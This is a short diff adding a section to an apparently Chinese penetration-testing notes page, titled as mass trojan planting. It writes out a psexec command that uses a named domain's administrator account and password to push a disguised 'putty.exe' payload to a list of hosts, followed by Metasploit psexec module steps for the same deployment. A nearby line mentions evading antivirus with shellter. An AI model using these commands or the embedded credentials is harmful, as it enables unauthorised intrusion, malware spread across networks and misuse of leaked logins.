@@ -209,6 +209,16 @@ step3:
 6.better to use shellter to supass avkiller
 </code></pre>
 </div>
+
+<h3 id="x05-">0x05 批量种马</h3>
+<div class="highlighter-rouge"><pre class="highlight"><code>1&gt;psexec.exe @pc.txt -u ABIMAQ\Administrator -p k78m90 -c c:\recycler\putty.exe
+2&gt;msf
+    use exploit/windows/smb/psexec
+    set EXE::Custom /root/桌面/putty.exe
+    set RHOST -&gt; use armitage to choose pc.txt(192.168.11.1,192.168.11.2,etc)
+    exploit
+</code></pre>
+</div>
 </span>
 
         
